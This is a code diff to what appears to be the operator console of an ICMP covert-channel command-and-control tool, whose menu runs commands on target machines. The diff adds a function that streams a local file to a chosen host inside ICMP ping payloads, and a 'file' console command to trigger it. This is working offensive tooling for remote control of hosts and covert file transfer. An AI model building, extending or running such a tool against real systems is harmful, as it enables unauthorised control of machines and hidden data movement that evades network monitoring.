@@ -2,6 +2,7 @@
 #include <cstdint>
 #include <cstring>
 #include <cstdlib>
+#include <stdio.h>
 #include <string>
 #include <thread>
 #include <mutex>
@@ -218,6 +219,37 @@ void send_command(const std::string &dst, const std::string &command)
   }
 }
 
+void send_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
+{
+  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (sockfd == -1)
+  {
+    perror("socket");
+    exit(-1);
+  }
+
+  std::string cmd = "file ";
+  cmd.append(dst_file);
+
+  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
+
+  FILE *fp = fopen(src_file.c_str(), "rb");
+  uint8_t out[512];
+  if (fp == NULL) {
+    perror("fopen");
+    return;
+  }
+
+  size_t nbytes;
+  do
+  {
+    nbytes = fread(out, 1, sizeof(out), fp);
+    send_ping(sockfd, dst, out, nbytes);
+  } while (nbytes != 0);
+
+  send_ping(sockfd, dst, NULL, 0);
+}
+
 void ping(const std::string &dst)
 {
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
@@ -268,6 +300,7 @@ void help()
   std::puts("\tbeacon: clears active cache and pings all machines");
   std::puts("\trun [host] [command]: run a command on a target machine");
   std::puts("\trunall [command]: runs command on all machines");
+  std::puts("\tfile [host] [src] [dst]: send a file over to host machine");
   std::puts("\texport [filename]: exports currently connected hosts to file");
   std::puts("\tload [filename]: loads file to hosts list");
   std::puts("\tclear: clears currently connected list");
@@ -408,6 +441,20 @@ int main(int argc, char **argv)
                   << "\n";
         send_command(it->second, command);
       }
+    }
+    else if (input_arr.at(0).compare("file") == 0) 
+    {
+      if (input_arr.size() < 4)
+      {
+        std::puts("usage: file [host] [src] [dst]");
+        continue;
+      }
+      std::string ip = active_connections[input_arr.at(1)];
+
+      std::cout << "Sending file: " << input_arr.at(2) << " to: " << input_arr.at(3) << " on: "
+                << ip
+                << "\n";
+      send_file(ip, input_arr.at(2), input_arr.at(3));
     }
     else if (input_arr.at(0).compare("export") == 0)
     {
